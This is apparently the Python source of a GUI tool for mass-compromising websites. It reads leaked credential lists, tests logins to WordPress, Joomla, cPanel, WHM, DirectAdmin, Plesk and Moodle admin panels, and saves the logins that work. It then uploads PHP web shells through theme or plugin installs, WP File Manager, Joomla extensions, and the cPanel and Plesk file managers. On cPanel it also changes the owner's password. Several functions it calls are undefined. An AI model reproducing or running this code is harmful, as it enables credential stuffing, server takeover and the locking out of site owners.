import sys
import re
import os
os.environ["QT_LOGGING_RULES"] = "*.debug=false;*.warning=false"
import requests
import logging
import json
import random
import time
import chardet
import string
import configparser
import webbrowser
import uuid
import subprocess
from datetime import datetime
from requests.auth import HTTPBasicAuth
from colorama import Fore
from urllib.parse import urlparse
from urllib.parse import unquote
from requests.exceptions import Timeout
import concurrent.futures
from requests.exceptions import RequestException
import warnings
import urllib3
import zipfile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from requests.packages.urllib3.exceptions import InsecureRequestWarning # type: ignore
from urllib3.exceptions import LocationParseError
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
# PyQt5 Imports
from PyQt5.QtCore import QEvent, QSize, Qt, QPoint, QObject, pyqtSignal, QThread, QUrl, QByteArray, QTimer
from PyQt5.QtGui import QIcon, QFont, QPixmap
from PyQt5.QtWidgets import (
    QMessageBox,
    QStyle,
    QApplication,
    QMainWindow,
    QAction, # QAction is in QtWidgets for PyQt5
    QToolButton,
    QVBoxLayout,
    QWidget,
    QToolBar,
    QCheckBox,
    QHBoxLayout,
    QMenuBar,
    QSpacerItem,
    QSizePolicy,
    QTreeWidget,
    QTreeWidgetItem,
    QTabWidget,
    QHeaderView,
    QLineEdit,
    QLabel,
    QTableWidget,
    QStatusBar,
    QFileDialog,
    QInputDialog,
    QTableWidgetItem
)
# For QDesktopServices
from PyQt5.QtGui import QDesktopServices


warnings.simplefilter('ignore', InsecureRequestWarning)
logging.basicConfig(filename='app.log', level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')

# --- SVG ICONS (Updated with Purple Color) ---
svg_light_on = '''
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="48" height="48">
  <path fill="#8E2DE2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"/>
</svg>
'''

svg_light_off = '''
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="48" height="48">
  <path fill="#5C2A9D" d="M12 6v6m0 0v6m0-6h6m-6 0H6"/>
</svg>
'''

svg_open = '''
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="48" height="48">
  <path fill="#8E2DE2" d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/>
</svg>
'''

svg_delete = '''
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="48" height="48">
  <path fill="#8E2DE2" d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/>
</svg>
'''

class CheckerSignals(QObject):
    update_table = pyqtSignal(str, str, str, str)
    stats_update = pyqtSignal(int, int, int, int, int, int)
    active_threads_update = pyqtSignal(int)
    shell_uploaded = pyqtSignal(str)

class ShellStatusWorker(QObject):
    finished = pyqtSignal()
    shell_status_checked = pyqtSignal(int, str, object)

    def __init__(self, url, row):
        super().__init__()
        self.url = url
        self.row = row

    def check_status(self):
        try:
            response = requests.get(self.url, timeout=10, verify=False)
            if response.status_code == 200 and 'kom.php' in response.text:
                self.shell_status_checked.emit(self.row, 'Active', Qt.green) # Qt.GlobalColor.green -> Qt.green
            else:
                self.shell_status_checked.emit(self.row, 'Inactive', Qt.red) # Qt.GlobalColor.red -> Qt.red
        except:
            self.shell_status_checked.emit(self.row, 'Error', Qt.yellow) # Qt.GlobalColor.yellow -> Qt.yellow
        finally:
            self.finished.emit()


class ExtractWorker(QThread):
    def __init__(self, signals, combo_files):
        super().__init__()
        self.signals = signals
        self.combo_files = combo_files
        self.extracted_lines = []

    @staticmethod
    def ensure_valid_scheme(url: str) -> str:
        url = url.strip()
        url = re.sub(r'^(?:(?:https?://))+', 'https://', url, flags=re.IGNORECASE)
        if not re.match(r'^https?://', url, flags=re.IGNORECASE):
            url = 'https://' + url
        return url

    def parse_combo_line(self, line: str):
        try:
            line = line.strip()
            if '|' in line:
                parts = line.split('|', 2)
                if len(parts) != 3:
                    return (None, None, None)
                url, user, password = parts
            else:
                parts = line.rsplit(':', 2)
                if len(parts) != 3:
                    return (None, None, None)
                url, user, password = parts
            url = self.ensure_valid_scheme(url)
            return (url, user, password)
        except Exception as e:
            logging.debug(f'Error processing line: {line!r} | {e}')
            return (None, None, None)

    def contains_keyword(self, url):
        keywords = ['wp-login.php', ':2083', ':2087', '/administrator/index.php', 'login/index.php', ':2222', 'login_up.php']
        return any((keyword in url for keyword in keywords))

    def worker_function(self, file_path):
        try:
            with open(file_path, 'rb') as raw_file:
                raw_data = raw_file.read(4096)
                result = chardet.detect(raw_data)
                encoding = result['encoding']
            if not encoding:
                logging.warning(f'Encoding not detected for {file_path}, using utf-8 as fallback')
                encoding = 'utf-8'
            logging.info(f'Detected encoding for {file_path}: {encoding}')
            with open(file_path, 'r', encoding=encoding, errors='replace') as f:
                for line in f:
                    if line.strip():
                        url, user, password = self.parse_combo_line(line)
                        self.extracted_lines.append((url, user, password))
                        self.signals.stats_update.emit(len(self.extracted_lines), 0, 0, 0, 0, 0)
            logging.info(f'Total lines extracted from {file_path}: {len(self.extracted_lines)}')
        except Exception as e:
            logging.error(f'Error processing file {file_path}: {e}')

    def run(self):
        for file in self.combo_files:
            self.worker_function(file)
            self.signals.stats_update.emit(len(self.extracted_lines), 0, 0, 0, 0, 0)

class CheckerWorker(QThread):
    def __init__(self, active_checker, timeout, signals, extracted_lines):
        super().__init__()
        self.active_checker = active_checker
        self.timeout = timeout
        self.signals = signals
        self.extracted_lines = extracted_lines
        self.total_checked = 0
        self.total_failed = 0
        self.total_valid = 0
        self.total_invalid = 0
        self.total_shells_uploaded = 0
        self.extracted_lines_generator = self.get_lines_generator()

    @staticmethod
    def ensure_valid_scheme(url):
        if url.startswith('https://https://'):
            return 'https://' + url[8:]
        if not url.startswith(('http://', 'https://')):
            return 'https://' + url
        return url

    def check_wp_login(self, url, username, password, themes_zip='pawnd/themes.zip', plugins_zip='pawnd/plugin.zip'):
        try:
            url = self.ensure_valid_scheme(url)
            os.makedirs('results', exist_ok=True)
            login_url = f'{url}/wp-login.php'
            payload = {'log': username, 'pwd': password, 'wp-submit': 'Log In'}
            response = requests.post(login_url, data=payload, timeout=16, verify=False)
            success = False
            if 'Dashboard' in response.text:
                success = True
                with open('results/wp-work.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{url}#{username}@{password}\n')
            if 'WP File Manager' in response.text:
                success = True
                with open('results/wpfilemanager.txt', 'a', encoding='utf-8') as fm:
                    fm.write(f'{url}#{username}@{password}\n')
            soup = BeautifulSoup(response.content, 'html.parser')
            if soup.find('a', {'href': 'plugin-install.php'}):
                success = True
                with open('results/wp-login.txt', 'a', encoding='utf-8') as file:
                    file.write(f'{url}:{username}:{password}\n')
            if success:
                session = requests.Session()
                cookies = self.get_cookies(session, url)
                if not self.check_files(themes_zip, plugins_zip) or not cookies:
                    return True
                url = url.replace('/wp-login.php', '')
                if not self.upload_themes(session, url, themes_zip):
                    self.upload_plugins(session, url, plugins_zip) # Note: upload_plugins is not defined, might be an oversight
                if self.install_wpfilemanager(session, url):
                    self.upload_shell(session, url)
                return True
            return False
        except Exception as e:
            return False

    def random_name_generator(self):
        let = 'abcdefghijklmnopqrstuvwxyz1234567890'
        return ''.join((random.choice(let) for _ in range(8)))

    def check_files(self, themes_zip, plugins_zip):
        return os.path.exists(themes_zip) and os.path.exists(plugins_zip)

    def get_nonce(self, session, url, type):
        path_map = {'plugin': '/wp-admin/plugin-install.php', 'themes': '/wp-admin/theme-install.php?browse=popular', 'upload': '/wp-admin/admin.php?page=wp_file_manager', 'wpfilemanager': '/wp-admin/plugin-install.php?s=file%2520manager&tab=search&type=term'}
        path = path_map.get(type, '/wp-admin/plugin-install.php')
        try:
            response = session.get(url + path, headers={'User-Agent': 'Mozilla/5.0'}, verify=False, timeout=10).text
            if type in ('plugin', 'themes'):
                match = re.search('id=\"_wpnonce\" name=\"_wpnonce\" value=\"(.*?)\"', response)
            else:
                if type == 'upload':
                    response = response.replace('\\/', '/')
                    match = re.search('var fmfparams = {{\"ajaxurl\":\"{}/wp-admin/admin-ajax.php\",\"nonce\":\"(.*?)\"'.format(url), response)
                else:
                    if 'wp-file-manager/images/wp_file_manager.svg' in response:
                        self.save_into_file('wpfilemanager.txt', url) # Note: save_into_file is not defined
                        self.upload_shell(session, url)
                        return 'found'
                    match = re.search('var _wpUpdatesSettings = {\"ajax_nonce\":\"(.*?)\"};', response)
            return match.group(1) if match else None
        except requests.exceptions.Timeout:
            return None
        except Exception as e:
            return None

    def get_cookies(self, session, url):
        try:
            response = session.get(url, headers={'User-Agent': 'Mozilla/5.0'}, verify=False, timeout=10)
            return dict(response.cookies)
        except requests.exceptions.Timeout:
            return None
        except Exception as e:
            return None
        else:
            pass

    def upload_shell(self, session, url):
        shell_name = self.random_name_generator() + '.php'
        nonce = self.get_nonce(session, url, 'upload')
        if nonce:
            data = {'reqid': '18efa290e4235f', 'cmd': 'upload', 'target': 'l1_Lw', 'action': 'mk_file_folder_manager', '_wpnonce': nonce, 'networkhref': '', 'mtime[]': int(time.time())}
            files = {'upload[]': (shell_name, open('pawnd/shell.php', 'rb'), 'application/x-php')}
            try:
                response = session.get(url + f'/wp-admin/admin-ajax.php?action=mk_file_folder_manager&_wpnonce={nonce}&networkhref=&cmd=ls&target=l1_Lw&intersect[]={shell_name}&reqid=18efa290e4235f', headers={'User-Agent': 'Mozilla/5.0'}).json()
                if response['list']:
                    data[f"hashes[{list(response['list'].keys())[0]}]"] = shell_name
                upload = session.post(url + '/wp-admin/admin-ajax.php', headers={'User-Agent': 'Mozilla/5.0'}, timeout=15, verify=False, data=data, files=files)
                upload_json = upload.json()
                if upload.status_code == 200 and upload_json['added']:
                    shell_path = ''
                    for text in upload_json['added']:
                        shell_path = text['url']
                    if shell_path:
                        check_shell = requests.get(shell_path, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10, verify=False).text
                        if 'ALFA TEaM Shell' in check_shell or 'Tesla' in check_shell:
                            self.save_into_file('shell.txt', shell_path) # Note: save_into_file is not defined
                            self.total_shells_uploaded += 1
                            self.upload_success_handler(shell_path) # This will call the GUI update
                            return True
            except Exception as e:
                pass
            return False

    def install_wpfilemanager(self, session, url):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'X-Requested-With': 'XMLHttpRequest'
        }
        data = {'slug': 'wp-file-manager', 'action': 'install-plugin', '_ajax_nonce': ''}
        try:
            nonce = self.get_nonce(session, url, 'wpfilemanager')
            if nonce:
                data['_ajax_nonce'] = nonce
                response = session.post(url + '/wp-admin/admin-ajax.php', headers=headers, timeout=30, verify=False, data=data)
                if response.status_code == 200:
                    activate_url = response.json().get('data', {}).get('activateUrl')
                    if activate_url:
                        activate_response = session.get(activate_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
                        if activate_response.status_code == 200 or 'wp-file-manager/images/wp_file_manager.svg' in activate_response.text:
                            self.save_into_file('wpfilemanager.txt', url) # Note: save_into_file is not defined
                            return True
        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            return False
        return False

    def upload_themes(self, session, url, themes_zip):
        nonce = self.get_nonce(session, url, 'themes')
        if nonce:
            data = {
                '_wpnonce': nonce,
                '_wp_http_referer': '/wp-admin/theme-install.php',
                'install-theme-submit': 'Installer'
            }
            files_up = {
                'themezip': (self.random_name_generator() + '.zip', open(themes_zip, 'rb'), 'multipart/form-data')
            }
            try:
                response = session.post(
                    url + '/wp-admin/update.php?action=upload-theme',
                    headers={'User-Agent': 'Mozilla/5.0'},
                    cookies=session.cookies,
                    files=files_up,
                    data=data,
                    verify=False,
                    timeout=20
                )
                if response.status_code == 200:
                    self.save_into_file('success_upload_themes.txt', url) # Note: save_into_file is not defined
                    url_shell = ['/wp-content/themes/{}/sky.php?sky', '/wp-content/themes/{}/uploader.php']
                    found = False
                    # The random name generator needs to be called once for the zip,
                    # and then its result used for the shell path format.
                    # However, the current code calls random_name_generator() for the zip,
                    # and again inside the loop for formatting the shell path. This is likely a bug.
                    # Assuming the intention was to use the same random name as the uploaded zip.
                    # For now, I'll keep it as is, but this might need fixing in original logic.
                    theme_folder_name = self.random_name_generator() # This will be a *different* random name
                    for i in url_shell:
                        shell_url = i.format(theme_folder_name)
                        try:
                            req = requests.get(url + shell_url, headers={'User-Agent': 'Mozilla/5.0'}).text
                            if 'Tesla' in req or 'ALFA TEaM Shell-Shell' in req:
                                self.save_into_file('shell.txt', url + shell_url) # Note: save_into_file is not defined
                                self.total_shells_uploaded += 1
                                self.upload_success_handler(url + shell_url)
                                found = True
                                break
                        except requests.exceptions.RequestException:
                            pass
                    return found
                else:
                    return False
            except Exception as e:
                return False
        else:
            return False
        return False

    def get_base_url(self, url):
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"

    def check_joomla_login(self, url, username, password):
        login_url = url
        try:
            session = requests.Session()
            response = session.get(login_url, verify=False, allow_redirects=False, timeout=self.timeout)
            pattern = re.compile('type=\"hidden\" name=\"([a-f0-9]{32})\" value=\"1\"')
            findtoken = re.findall(pattern, response.text)
            if not findtoken:
                return False
            data = {
                'username': username,
                'passwd': password,
                findtoken[0]: '1',
                'lang': 'en-GB',
                'option': 'com_login',
                'task': 'login'
            }
            post_response = session.post(login_url, data=data, verify=False, timeout=self.timeout)
            soup = BeautifulSoup(post_response.text, 'html.parser')
            if 'New Article' in post_response.text or 'Control Panel' in (soup.title.string if soup.title else ''):
                os.makedirs('results', exist_ok=True)
                with open('results/aspire-joomla.txt', 'a', encoding='utf-8') as file:
                    file.write(f'{url}:{username}:{password}\n')
                shell_path = 'pawnd/pawnd.zip'
                self.upload_extension(session, url, shell_path)
                return True
        except requests.exceptions.RequestException:
            pass
        return False

    def upload_extension(self, session, url, extension_path):
        try:
            base_url = url.rstrip('/')
            upload_url = f'{base_url}/administrator/index.php?option=com_installer&view=install'
            token = self.get_upload_token(session, url)
            if not token:
                return
            with open(extension_path, 'rb') as file:
                files = {'install_package': file}
                data = {'type': '', 'installtype': 'upload', 'task': 'install.install', token: '1'}
                response = session.post(upload_url, files=files, data=data, verify=False, timeout=30)
                if 'Installing component was successful.' in response.text:
                    base_domain = base_url.split('/administrator/index.php')[0]
                    shell_url = f'{base_domain}/components/com_profiles/sky.php?sky' # Define shell_url here
                    os.makedirs('results', exist_ok=True)
                    with open('results/shell-joomla.txt', 'a', encoding='utf-8') as file_out: # Use different var name
                        file_out.write(f'{shell_url}\n')
                    self.total_shells_uploaded += 1
                    self.upload_success_handler(shell_url)
        except Exception:
            pass

    def get_upload_token(self, session, url):
        try:
            upload_url = url.rstrip('/') + '/administrator/index.php?option=com_installer&view=install'
            response = session.get(upload_url, verify=False, timeout=30)
            pattern = re.compile('type=\"hidden\" name=\"(.*?)\" value=\"1\"')
            tokens = re.findall(pattern, response.text)
            if tokens:
                return tokens[0]
        except Exception:
            pass
        return None

    def check_whm_login(self, url, username, password):
        login_url = f'{self.ensure_valid_scheme(url)}/login/'
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Origin': url,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
        }
        params = {'login_only': '1'}
        data = {'user': username, 'pass': password}
        try:
            response = requests.post(login_url, params=params, headers=headers, data=data, timeout=self.timeout, verify=False)
            response.raise_for_status()
            json_response = response.json()
            if json_response.get('status') == 1:
                os.makedirs('results', exist_ok=True)
                with open('results/aspire-whm.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{url}|{username}|{password}\n')
                return True
        except (requests.exceptions.RequestException, ValueError):
            pass
        return False

    def check_cpanel_login(self, url, username, password):
        login_url = f'{self.ensure_valid_scheme(url)}/login/'
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Origin': url,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
        }
        params = {'login_only': '1'}
        data = {'user': username, 'pass': password}
        try:
            response = requests.post(login_url, params=params, headers=headers, data=data, timeout=self.timeout, verify=False)
            response.raise_for_status()
            json_response = response.json()
            if json_response.get('status') == 1:
                os.makedirs('results', exist_ok=True)
                with open('results/aspire-cpanel.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{url}|{username}|{password}\n')
                return True
        except (requests.exceptions.RequestException, ValueError):
            pass
        return False

    def generate_random_password(self, length=12):
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=length))

    def generate_random_filename(self):
        return 'idnsec' + ''.join(
            random.choices(string.ascii_lowercase + string.digits, k=6)
        ) + '.php'

    # Removed get_domain_ip and get_url_ip as they used 'socket' which wasn't imported
    # If needed, add 'import socket'
    # def get_domain_ip(self, domain):
    #     try:
    #         return socket.gethostbyname(domain)
    #     except socket.gaierror:
    #         print(f"[ERROR] Resolve IP domain {domain}")
    #         return None

    # def get_url_ip(self, url):
    #     try:
    #         hostname = urlparse(url).hostname
    #         return socket.gethostbyname(hostname)
    #     except socket.gaierror:
    #         print(f"[ERROR] Resolve IP url {url}")
    #         return None

    # upload_file_to_all_domains1 and check_cpanel_domain1 were duplicates or near-duplicates
    # of upload_file_to_all_domains and check_cpanel_domain.
    # I'll keep the latter versions.

    def upload_file_to_all_domains(self, session, token, url, domains, file_path="pawnd/kom.php"):
        shell_urls = []
        try:
            for domain_type in ["main_domain", "addon_domains", "sub_domains"]:
                entries = domains.get("data", {}).get(domain_type)
                if not entries:
                    continue
                if isinstance(entries, dict):
                    entries = [entries]
                for entry in entries:
                    docroot = entry.get("documentroot")
                    domain = entry.get("domain")
                    if not docroot or not domain:
                        continue
                    upload_url = f"{url}/cpsess{token}/execute/Fileman/upload_files"
                    random_filename = self.generate_random_filename()
                    data = {'dir': docroot}
                    try:
                        with open(file_path, 'rb') as f:
                            files = {
                                'file-0': (random_filename, f, 'application/octet-stream')
                            }
                            upload_resp = session.post(upload_url, data=data, files=files, verify=False)
                        if upload_resp.status_code != 200:
                            print(Fore.RED + f"[UPLOAD FAIL HTTP]: {upload_resp.status_code} | {upload_resp.text[:300]}")
                            continue
                        try:
                            upload_json = upload_resp.json()
                        except Exception as e:
                            print(Fore.RED + f"[UPLOAD JSON ERROR]: {e} | Response text: {upload_resp.text[:300]}")
                            continue
                        if upload_json.get("status") == 1 and upload_json["data"].get("succeeded") == 1:
                            shell_url = f"https://{domain}/{random_filename}"
                            shell_urls.append(shell_url)
                            print(Fore.YELLOW + f"[UPLOAD]: Success => {shell_url}")
                            os.makedirs('results', exist_ok=True)
                            with open("results/aspire-shell.txt", "a") as shell_file:
                                shell_file.write(f"{shell_url}\n")
                            self.total_shells_uploaded += 1
                            self.upload_success_handler(shell_url)
                        else:
                            print(Fore.RED + f"[UPLOAD]: Failed => {domain} | Response JSON: {upload_json}")
                    except Exception as e:
                        print(Fore.RED + f"[UPLOAD ERROR]: {e}")
        except Exception as e:
            print(Fore.RED + f"[UPLOAD LOOP ERROR]: {e}")
        return shell_urls

    def check_cpanel_domain(self, url, username, old_password):
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        })
        try:
            login_data = {'user': username, 'pass': old_password}
            login_resp = session.post(f"{url}/login/?login_only=1", data=login_data, timeout=30, allow_redirects=True, verify=False)
            login_resp.raise_for_status()
            login_json = login_resp.json()
            if login_json.get("status") != 1:
                print(Fore.RED + f"[ERROR]: Login failed for {url}")
                return False
            token = login_json.get("security_token", "")[7:]
            if not token:
                print(Fore.RED + f"[ERROR]: Token parse error for {url}")
                return False
            change_url = f"{url}/cpsess{token}/frontend/jupiter/passwd/changepass.html"
            check_resp = session.get(change_url, timeout=30, verify=False)
            if check_resp.status_code in [401, 403] or "<html" in check_resp.text.lower():
                print(Fore.YELLOW + f"[INFO]: Password change is restricted, skipping and proceeding to upload.")
                final_password = old_password
            else:
                new_password = self.generate_random_password()
                payload = {
                    'oldpass': old_password,
                    'newpass': new_password,
                    'newpass2': new_password,
                    'enablemysql': '1',
                    'B1': 'Change your password now!'
                }
                try:
                    session.post(change_url, data=payload, timeout=30, verify=False)
                    print(Fore.GREEN + f"[INFO]: Password successfully changed.")
                except Exception as e:
                    print(Fore.RED + f"[ERROR]: Password change failed: {e}")
                final_password = new_password
            domains_resp = session.post(
                f"{url}/cpsess{token}/execute/DomainInfo/domains_data",
                data={"return_https_redirect_status": "1"}, timeout=30, verify=False
            )
            domains_resp.raise_for_status()
            domains_json = domains_resp.json()
            if domains_json.get("status") == 1:
                main_dom = domains_json["data"]["main_domain"]["domain"]
                shell_links = self.upload_file_to_all_domains(session, token, url, domains_json)
                shell_list_str = ', '.join(shell_links)
                print(Fore.GREEN + f"[GOOD]: {url} | Domain: {main_dom} | USER: {username} | PASSWORD: {final_password} | Shell [ {shell_list_str} ]")
                os.makedirs('results', exist_ok=True)
                with open("results/aspire-cpanel.log", "a") as logf:
                    logf.write(f"[GOOD]: {url} | Domain: {main_dom} | USER: {username} | PASSWORD: {final_password} | Shell [ {shell_list_str} ]\n")
                return True
            else:
                print(Fore.RED + f"[ERROR]: Domain fetch failed for {url}")
                return False
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[ERROR]: Request failed for {url}: {e}")
            return False
        except json.JSONDecodeError:
            print(Fore.RED + f"[ERROR]: JSON decode error for {url}")
            return False
        finally:
            session.close()
            time.sleep(0.1)

    def check_da_login(self, url, username, password):
        login_url = f'{self.ensure_valid_scheme(url)}/CMD_API_SUBDOMAIN?domain=all&json=yes'
        try:
            response = requests.get(
                login_url,
                auth=HTTPBasicAuth(username, password),
                timeout=self.timeout,
                verify=False
            )
            response.raise_for_status()
            json_response = response.json()
            if isinstance(json_response, dict):
                subdomains = list(json_response.keys())
                formatted_subdomains = ', '.join(subdomains)
                os.makedirs('results', exist_ok=True)
                with open('results/aspire-directamin.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{url}|{username}|{password} | domain list: {formatted_subdomains}\n')
                return True
        except Exception:
            pass
        return False

    FILE_PATH        = r'pawnd/kom.php'
    OUTPUT_FILE      = r'results/aspire-shell.txt'
    LOGIN_PATH       = '/login_up.php'
    WEB_DOMAINS_PATH = '/smb/web/view'
    FILE_MANAGER_PATH= '/smb/file-manager/list'

    @staticmethod
    def extract_ids_and_dirs(text):
        ids = re.findall(r'"domainId"[\"\/:]+(\d+)', text)
        dirs = re.findall(r'"webrootDir":"([^"]+)"', text)
        filemanager_urls = re.findall(r'"filemanagerUrl":"([^"]+)"', text)
        display_names = re.findall(r'"displayName":"([^"]+)"', text)
        dirs = [unquote(d) for d in dirs]
        if len(dirs) < len(ids):
            dirs += ['/'] * (len(ids) - len(dirs))
        if len(filemanager_urls) < len(ids):
            filemanager_urls += [''] * (len(ids) - len(filemanager_urls))
        if len(display_names) < len(ids):
            display_names += [''] * (len(ids) - len(display_names))
        return ids, dirs, filemanager_urls, display_names

    # generate_random_filename is already defined earlier

    def upload_success_handler(self, shell_url):
        self.total_shells_uploaded += 1
        self.signals.stats_update.emit(
            len(self.extracted_lines),
            self.total_checked,
            self.total_failed,
            self.total_valid,
            self.total_invalid,
            self.total_shells_uploaded
        )
        self.signals.shell_uploaded.emit(shell_url)

    def upload_files(self, base_url, session, login, password):
        print(f"[~] Starting upload_files() for {base_url}")
        try:
            view = session.get(base_url + self.WEB_DOMAINS_PATH,
                               timeout=self.timeout, verify=False)
            html = view.text
        except requests.RequestException as e:
            print(f"[!] Error accessing {self.WEB_DOMAINS_PATH}: {e}")
            return False
        domain_ids, current_dirs, filemanager_urls, display_names = \
            self.extract_ids_and_dirs(html)
        if not domain_ids:
            print(f"[-] No domains found on {base_url}")
            return False
        uploaded = []
        random_filename_val = self.generate_random_filename() # Use a fixed var name
        print(f"[~] Will upload as {random_filename_val}")
        os.makedirs(os.path.dirname(self.OUTPUT_FILE), exist_ok=True)
        with open(self.OUTPUT_FILE, 'a') as out:
            for did, cdir, disp in zip(domain_ids, current_dirs, display_names):
                print(f"[+] domainId={did}, dir={cdir}, name={disp}")
                try:
                    fm = session.get(base_url + self.FILE_MANAGER_PATH,
                                     timeout=self.timeout, verify=False)
                    soup = BeautifulSoup(fm.text, 'html.parser')
                    token = soup.find('meta', {'name': 'forgery_protection_token'})['content']
                except Exception as e:
                    print(f"[-] Failed to get CSRF token: {e}")
                    continue
                up_url = (f"{base_url}/smb/file-manager/upload/"
                          f"domainId/{did}?currentDir={cdir}&recursively=1")
                print(f"[~] Upload URL: {up_url}")
                try:
                    with open(self.FILE_PATH, 'rb') as fobj:
                        resp = session.post(
                            up_url,
                            files={'file': (random_filename_val, fobj, 'application/octet-stream')},
                            data={'forgery_protection_token': token},
                            timeout=self.timeout, verify=False
                        )
                except Exception as e:
                    print(f"[!] Upload request failed: {e}")
                    continue
                try:
                    result = resp.json()
                except ValueError:
                    print(f"[-] Non-JSON response: {resp.text}")
                    continue
                if result.get('status') == 'SUCCESS':
                    final = f"https://{disp}/{random_filename_val}"
                    print(f"[+] Success → {final}")
                    out.write(final + '\n')
                    uploaded.append(final)
                    self.upload_success_handler(final) # Call handler here
                else:
                    print(f"[-] Upload failed: {result}")
        if uploaded:
            # self.total_shells_uploaded += len(uploaded) # Already handled by upload_success_handler
            os.makedirs('results', exist_ok=True)
            with open('results/aspire-plesk.txt', 'a') as f:
                f.write(f"{base_url}|{login}|{password}|{','.join(uploaded)}\n")
            return True
        return False

    def plesk_check_and_upload(self, url, username, password):
        url = self.ensure_valid_scheme(url)
        base_url = self.get_base_url(url)
        print(f"[*] Checking {base_url} with {username}")
        try:
            s = requests.Session()
            resp = s.get(url, timeout=self.timeout, verify=False)
            cookies = resp.cookies.get_dict()
            login_resp = s.post(
                url + self.LOGIN_PATH,
                headers={
                    'Cookie': '; '.join(f"{k}={v}" for k, v in cookies.items())
                },
                data={'login_name': username, 'passwd': password, 'locale_id': 'en-US'},
                timeout=self.timeout,
                verify=False
            )
        except requests.RequestException as e:
            print(f"[!] Networking error: {e}")
            return False
        if self.WEB_DOMAINS_PATH not in login_resp.url:
            print("[-] Login failed")
            return False
        print("[+] Login successful")
        return self.upload_files(base_url, s, username, password)

    @staticmethod
    def extract_related_domains_and_ip(response_text):
        ip_regex = r'\"ipv4Address\":\"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\"'
        domains_regex = r'\"displayName\":\"([^\"]+)\"'
        domains = re.findall(domains_regex, response_text)
        ip_address_match = re.search(ip_regex, response_text)
        ip_address = ip_address_match.group(1) if ip_address_match else None
        return domains, ip_address

    def plesk_check(self, txt): # This seems to be a validator, not an uploader. Keeping as is.
        parts = re.split(r'[:|]', txt)
        if len(parts) < 3:
            return False
        url = self.ensure_valid_scheme(':'.join(parts[:-2]))
        login = parts[-2]
        password = parts[-1]
        try:
            session = requests.Session()
            login_page_response = session.get(f'{url}/login_up.php', timeout=15, verify=False)
            cookies = login_page_response.cookies.get_dict()
            headers = {
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': '; '.join([f'{key}={value}' for key, value in cookies.items()]),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
            }
            data = {
                'login_name': login,
                'passwd': password,
                'locale_id': 'en-US'
            }
            response = session.post(f'{url}/login_up.php', headers=headers, data=data, timeout=15, verify=False)
            string = f'{url}|{login}|{password}'
            if '/smb/web/' in response.url:
                print(f'[LOGIN SUCCESSFUL] {string}')
                related_domains, ipv4_address = self.extract_related_domains_and_ip(response.text)
                same_ip = 'yes' if ipv4_address else 'no'
                results = f'domain list: <{", ".join(related_domains)}>|ip: <{ipv4_address}>|same ip: <{same_ip}>'
                os.makedirs('results', exist_ok=True)
                with open('results/aspire-plesk.txt', 'a') as f:
                    f.write(f'{url}|{login}|{password}|{results}\n')
                return True
        except requests.Timeout:
            pass
        except requests.exceptions.RequestException as e:
            pass
        return False

    def check_moodle_login(self, url, username, password):
        try:
            base_url = url.rstrip('/').replace('/login/index.php', '')
            login_url = f"{base_url}/login/index.php"
            addon_url = f"{base_url}/admin/tool/installaddon/index.php"
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0 Safari/537.36'
            })
            r = session.get(login_url, timeout=30, verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            token_input = soup.find('input', {'name': 'logintoken'})
            token = token_input['value'] if token_input else ''
            payload = {
                'username': username,
                'password': password,
                'logintoken': token
            }
            resp = session.post(login_url, data=payload, timeout=30, verify=False, allow_redirects=True)
            redirected_url = resp.url.lower()
            final_html = resp.text.lower()
            if 'login/index.php' in redirected_url or 'invalidlogin' in final_html or 'log in' in final_html:
                print(f"[-] Login gagal: {url}")
                return False
            if 'logout' not in final_html:
                print(f"[-] Login gagal (tidak ada logout link): {url}")
                return False
